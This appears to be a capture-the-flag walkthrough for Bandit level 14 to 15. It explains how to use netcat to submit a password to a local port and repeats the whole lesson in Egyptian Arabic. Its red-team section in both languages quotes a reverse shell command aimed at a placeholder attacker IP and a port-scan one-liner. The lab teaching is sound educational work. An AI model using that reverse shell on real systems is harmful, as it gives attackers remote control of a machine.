### 🏴‍☠️ [Level 14 &rarr; Level 15]

**1. 🎯 The Objective & The "Why"**
- **The Question:** The password for the next level can be retrieved by submitting the password of the current level to port `30000` on `localhost`.
- **The Goal:** You need to open a raw network connection to a specific port on the local machine, and SEND data through that connection (your current password), then READ whatever comes back (the next password). No SSH login involved here — this is raw, direct network communication with a listening service.
- **The Why:** This is your first taste of **manual network interaction** — talking directly to a service over TCP without a "nice" client wrapping the protocol for you. This is EXACTLY what happens when you're pentesting a custom application protocol, testing an API manually, or interacting with a backdoor/listener during a red team engagement. If you can't talk to a raw socket by hand, you can't properly test anything beyond standard HTTP/SSH.

**2. 💻 The Execution (Step-by-Step)**
You're logged in as `bandit14`. First, let's grab your current password so we have it ready to submit:

```bash
cat /etc/bandit_pass/bandit14
```
Keep that value handy — we're about to send it over the network.

Now, the tool we need is `nc`, short for **netcat** — often called "the Swiss Army knife of networking" because it can create raw TCP/UDP connections and just pass data back and forth, no frills attached.

```bash
nc localhost 30000
```
- `nc`: The netcat command itself.
- `localhost`: This is a special hostname that always points back to "the machine I'm currently sitting on." Since the challenge says the service is running "on localhost," we're not reaching out across the internet — we're connecting to a service running on this SAME server we're already SSH'd into.
- `30000`: The port number. Think of an IP address as a building's street address, and a port number as a specific apartment/office number inside that building. Port 30000 is where this particular password-checking service is "listening" for connections.

Once you run this, your terminal will look like it's just hanging there, doing nothing — but it's NOT frozen, it's actually now DIRECTLY connected to that service, waiting for you to type something. This is the "interactive" nature of raw socket connections.

Now, type (or paste) your CURRENT password (the bandit14 one) and hit Enter:

```
[Password_Appears_Here]
```

The moment you hit Enter, that text gets sent straight to the service listening on port 30000. The service reads it, checks if it's correct, and if it is, sends back the password for level 15 directly onto your screen, right there in the same connection.

After receiving the response, the connection usually closes automatically (or you can press `Ctrl+C` to manually exit if it hangs).

**Alternative approach using `openssl s_client`:**
This level's toolset mentions `openssl s_client` too, but that's specifically meant for ENCRYPTED (SSL/TLS) connections — this port 30000 is a PLAIN, unencrypted connection, so plain `nc` is the correct and simplest tool here. We'll see `openssl s_client` shine in the next level when encryption gets involved.

**3. 🌍 Real-World & Tactical Application**
Raw socket communication with `nc` is one of the most fundamental skills in network penetration testing.

- **🔴 Red Team Perspective:** Netcat is legendarily nicknamed "the hacker's Swiss Army knife" for a reason — attackers use it to set up reverse shells (`nc -e /bin/bash attacker_ip 4444`), transfer files between compromised machines, perform quick port scans (`nc -zv target 1-1000`), and manually interact with custom/unknown network services during recon to figure out what protocol they're speaking before writing a proper exploit. Understanding how to manually "talk" to any open port is foundational recon skill #1.
- **🔵 Blue Team Perspective:** Defenders monitor for unusual netcat usage on endpoints because it's SO commonly abused for reverse shells and data exfiltration that many security teams flag or outright block `nc` execution via EDR/application whitelisting on production servers. Network-level defenders also watch for unexpected outbound connections on unusual high-numbered ports, since that's a classic C2 (command-and-control) beacon pattern.

**4. 🚦 The Filter (Focus vs. Ignore)**
- **FOCUS ON:** The `nc hostname port` syntax as your default tool for raw, unencrypted TCP interaction. Understand the concept of "the connection stays open and interactive" — you type, it sends, you read the reply, right there live.
- **IGNORE:** Don't worry about `telnet` as an alternative right now (it does something similar but is older/less flexible), and don't touch `openssl s_client` yet — that's specifically for encrypted connections, which is the NEXT level's lesson, not this one.

---

> **5. 🇪🇬  (Sirius Notes - Egyptian Arabic)**
>
> اللفل ده هيخليك تتكلم مع سيرفر مباشرة عن طريق الشبكة، من غير SSH ولا حاجة، خليني اوريك.
>
> **1. 🎯 الهدف و "الليه"**
> - **السؤال:** الباسورد بتاع اللفل الجاي تقدر تجيبه لما تبعت باسورد اللفل الحالي لبورت `30000` على `localhost`.
> - **الهدف:** لازم تفتح اتصال شبكة خام (raw) على بورت معين في نفس الجهاز، وتبعت من خلاله بيانات (الباسورد الحالي بتاعك)، وتقرا اللي هيرجعلك (الباسورد الجاي). مفيش SSH login هنا خالص—ده اتصال شبكة مباشر وخام مع خدمة شغالة وواقفة تستنى.
> - **الليه؟** ده أول تعامل ليك مع **التفاعل اليدوي مع الشبكة**—إنك تتكلم مباشرة مع خدمة عن طريق TCP من غير برنامج بيغلف البروتوكول ليك. ده بالظبط اللي بيحصل وانت بتختبر تطبيق بروتوكول مخصص، أو بتختبر API يدوياً، أو بتتفاعل مع باكدور/listener أثناء عملية Red Team. لو معرفتش تتكلم مع socket خام بإيدك، مش هتقدر تختبر أي حاجة أبعد من HTTP و SSH العاديين.
>
> **2. 💻 التنفيذ خطوة بخطوة**
> انت عامل login كـ `bandit14`. الأول، يلا ناخد الباسورد الحالي بتاعك عشان يكون جاهز نبعته:
>
> ```bash
> cat /etc/bandit_pass/bandit14
> ```
> خلي القيمة دي جاهزة—هنبعتها عبر الشبكة دلوقتي.
>
> دلوقتي، الأداة اللي محتاجينها هي `nc`، اختصار لـ **netcat**—غالباً بيتسمى "سكينة الجيش السويسرية بتاعة الشبكات" لإنه بيقدر يفتح اتصالات TCP/UDP خام ويمرر البيانات ذهاب وإياب، من غير أي زخرفة.
>
> ```bash
> nc localhost 30000
> ```
> - `nc`: أمر netcat نفسه.
> - `localhost`: ده اسم مضيف خاص دايماً بيشير لـ "الجهاز اللي أنا واقف عليه دلوقتي". بما إن التحدي بيقول إن الخدمة شغالة "على localhost"، احنا مش بنتواصل عبر الإنترنت—احنا بنتصل بخدمة شغالة على نفس السيرفر اللي إحنا أصلاً عاملين عليه SSH.
> - `30000`: رقم البورت. فكر في عنوان الـ IP كأنه عنوان مبنى في الشارع، ورقم البورت كأنه رقم شقة/مكتب معين جوه المبنى ده. البورت 30000 هو المكان اللي الخدمة دي بتاعة فحص الباسورد "واقفة تستنى" فيه اتصالات.
>
> بمجرد ما تشغل الأمر ده، التيرمينال هيبان زي إنه واقف مش بيعمل حاجة—بس هو مش متجمد، هو فعلاً دلوقتي **متصل مباشرة** بالخدمة دي، واقف يستنى إنك تكتب حاجة. دي طبيعة الاتصالات الخام "التفاعلية".
>
> دلوقتي، اكتب (أو الصق) الباسورد **الحالي** بتاعك (باسورد bandit14) ودوس Enter:
>
> ```
> [Password_Appears_Here]
> ```
>
> لحظة ما تدوس Enter، النص ده بيتبعت مباشرة للخدمة الواقفة على البورت 30000. الخدمة بتقراه، بتتأكد إنه صح، ولو صح، بتبعتلك باسورد اللفل 15 مباشرة على الشاشة، في نفس الاتصال ده بالظبط.
>
> بعد ما تستقبل الرد، الاتصال بيتقفل أوتوماتيك غالباً (أو تقدر تدوس `Ctrl+C` عشان تخرج يدوي لو فضل واقف).
>
> **طريقة بديلة باستخدام `openssl s_client`:**
> أدوات اللفل ده ذكرت `openssl s_client` كمان، بس ده مخصص للاتصالات **المشفرة** (SSL/TLS)—البورت 30000 ده اتصال عادي غير مشفر، فـ `nc` العادية هي الأداة الصح والأبسط هنا. هنشوف `openssl s_client` بتتألق في اللفل الجاي لما التشفير يدخل في الصورة.
>
> **3. 🌍 التطبيق الواقعي والتكتيكي**
> التواصل الخام عن طريق `nc` من أهم المهارات الأساسية في اختبار اختراق الشبكات.
>
> - **🔴 من منظور الـ Red Team:** الـ netcat اتلقب بـ "سكينة الجيش السويسرية بتاعة الهاكرز" لسبب وجيه—المهاجمين بيستخدموها لعمل reverse shells (`nc -e /bin/bash attacker_ip 4444`)، نقل ملفات بين أجهزة مخترقة، عمل فحص بورتات سريع (`nc -zv target 1-1000`)، والتفاعل اليدوي مع خدمات شبكة غريبة/مجهولة أثناء الاستطلاع عشان يعرفوا بيتكلموا بأنهي بروتوكول قبل ما يكتبوا استغلال حقيقي. فهمك إزاي "تتكلم" يدوياً مع أي بورت مفتوح مهارة استطلاع أساسية رقم واحد.
> - **🔵 من منظور الـ Blue Team:** المدافعين بيراقبوا استخدام netcat الغريب على الأجهزة لإنه بيتستخدم بكثرة جداً في reverse shells وسرقة البيانات، فكتير من فرق الأمن بتعلّم أو تمنع تنفيذ `nc` تماماً عن طريق EDR أو application whitelisting على سيرفرات الإنتاج. مدافعين الشبكة كمان بيراقبوا اتصالات خارجة غريبة على بورتات عالية غير معتادة، لإن ده نمط كلاسيكي لإشارة C2 (قيادة وتحكم).
>
> **4. 🚦 الفلتر (ركز/تجاهل)**
> - **ركز على:** صيغة `nc hostname port` كأداتك الافتراضية للتفاعل الخام غير المشفر عبر TCP. افهم مفهوم "الاتصال بيفضل مفتوح وتفاعلي"—انت بتكتب، هو بيبعت، انت بتقرا الرد، مباشرة ولحظياً.
> - **تجاهل:** متقلقش من `telnet` كبديل دلوقتي (بتعمل حاجة شبيهة بس أقدم وأقل مرونة)، ومتلمسش `openssl s_client` لسه—ده مخصص للاتصالات المشفرة، ودي درس اللفل **الجاي**، مش ده.
